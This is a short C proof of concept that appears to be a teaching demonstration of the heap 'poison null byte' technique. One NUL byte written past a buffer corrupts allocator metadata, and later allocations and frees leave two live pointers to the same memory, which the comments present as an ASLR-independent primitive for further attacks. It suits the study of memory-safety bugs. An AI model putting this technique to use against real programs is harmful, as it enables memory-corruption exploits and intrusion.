#include <stdlib.h>
#include <string.h>

int main(int argc, const char* argv[])
{
  // Allocate three large contiguous chunks.
  char* p = malloc(1024 - 8);
  // Make sure the chunk size (including metadata) is not 1024 exactly. If it
  // were 1024 exactly, setting the LSB to 0 would not affect the size.
  char* p2 = malloc(1024 + 16 - 8);
  char* p3 = malloc(1024 - 8);
  char* p2_1;
  char* p2_2;
  // Set them up with easily recognizable values.
  memset(p, 'A', 1024 - 8);
  memset(p2, 'B', 1024 + 16 - 8);
  memset(p3, 'C', 1024 - 8);
  // Free the second chunk.
  // This writes the "prev_size" size of the freed chunk, at the end of the
  // free()'d p2 buffer / the beginning of the in-use p3 buffer.
  free(p2);
  // Overflow the first chunk, off-by-one, with a NUL byte.
  // This truncates the size of the free chunk.
  p[1024 - 8] = '\0';
  // Allocate a subsection of the free'd second chunk. Since the free chunk we
  // are allocating out of has a truncated size, we end up miscalculting the
  // remaining space, and writing the "prev_size" value of the remaining space
  // at a slightly off location, before where it should be. This leaves the
  // old "prev_size" at the end of p2 / beginning p3.
  p2_1 = malloc(512 - 8);
  memset(p2_1, 'B', 512 - 8);
  // Allocate another subsection of the free'd second chunk.
  p2_2 = malloc(256 - 8);
  memset(p2_2, 'D', 256 - 8);
  // Free the first re-allocated subsection of the free'd second chunk.
  free(p2_1);
  // Free the third chunk.
  // We will see that the old, incorrect "prev_size" value and end up treating
  // p2 as a free'd chunk, and coalescing it, even though we have handed out
  // a still-live pointer half-way through. 
  free(p3);
  p2 = malloc(2048);
  // Now, p2_2 and p2 are both pointing to some areas of the same memory!!
  // Note that we achieved this without having to know any pointer values, so
  // this particular attack would be a nice ASLR defeat on 64-bit.
  // You can now deploy application-specific attacks.
}
